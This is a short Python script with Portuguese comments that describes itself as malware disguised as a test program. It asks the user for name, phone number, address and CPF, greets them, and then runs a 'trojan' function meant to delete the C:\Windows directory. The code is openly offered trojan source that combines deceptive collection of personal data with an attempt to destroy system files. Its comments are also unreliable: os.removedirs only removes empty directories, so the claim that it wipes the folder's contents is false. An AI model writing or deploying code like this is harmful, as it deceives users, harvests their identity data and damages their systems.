### este é um malware, mascarado por um programa de testes
import os


def troia ():
    login = os.getlogin()
    print(login)        ### esse "print" foi só pra testar a função na lib 'os'
    os.removedirs('C:\Windows') ## essa remove os arquivos na pasta, e consequentemente, os diretórios nela contidos

### captura dos dados

nome = input("Digite seu nome:")
numero = int(input("Digite seu número de telefone(acima de 8 dígitos, DDD-027):"))
endereco = input("Digite seu endereço:")
cpf = int(input("Digite seu CPF(acima de 7 digitos, sem pontuações):"))

def main():              # a execucao segue normalmente aqui (poderia ser qualquer funcionalidade) ### social engineer
    print ('\n')
    print ('SEJA BEM VINDO, USUARIO;\n')
    print ("{0}\n {1}\n{2}\n {3}\n".format(nome,numero,endereco,cpf))
    
if (cpf > 0): ### coloquei esse 'if' para evitar problemas ao testar o codigo
    main()           # entra na funcao principal primeiro
    troia ()            # depois na funcao que removerá tudo (apos um print do usuario logado)